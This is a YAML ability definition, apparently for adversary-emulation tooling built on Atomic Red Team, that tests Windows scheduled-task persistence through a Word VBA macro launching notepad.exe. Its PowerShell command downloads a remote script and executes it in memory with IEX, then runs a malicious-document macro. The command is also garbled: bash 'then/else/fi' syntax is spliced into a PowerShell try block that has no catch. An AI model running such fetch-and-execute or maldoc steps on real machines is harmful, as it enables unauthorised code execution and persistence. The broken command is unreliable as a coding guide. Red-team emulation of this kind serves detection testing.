- id: ecd3fa21-7792-41a2-8726-2c5c673414d3
  name: Task Scheduler via VBA
  description: 'This module utilizes the Windows API to schedule a task for code execution
    (notepad.exe). The task scheduler will execute "notepad.exe" within

    30 - 40 seconds after this module has run'
  tactic: privilege-escalation
  technique:
    attack_id: T1053.005
    name: 'Scheduled Task/Job: Scheduled Task'
  platforms:
    windows:
      psh:
        command: 'try {; New-Object -COMObject "Word.Application" | Out-Null; $process
          = "Word"; then : ; else Write-Host "You will need to install Microsoft Word
          manually to meet this requirement"; fi; [Net.ServicePointManager]::SecurityProtocol
          = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
          -UseBasicParsing); Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"
          -officeProduct "Word" -sub "Scheduler"'
        cleanup: Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - t1053.005
  - privilege-escalation
  author: Atomic Red Team
  additional_info:
    input_arguments:
      ms_product:
        description: Maldoc application Word
        type: string
        default: Word
    dependencies:
    - description: 'Microsoft #{ms_product} must be installed

        '
      prereq_command: "try {\n  New-Object -COMObject \"#{ms_product}.Application\"\
        \ | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\")\
        \ {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch\
        \ { exit 1 }\n"
      get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
        manually to meet this requirement"

        '
    technique_created: '2019-11-27T14:58:00.429Z'
    atomic_guid: ecd3fa21-7792-41a2-8726-2c5c673414d3
    import_timestamp: '2025-08-22T03:08:46.270396Z'
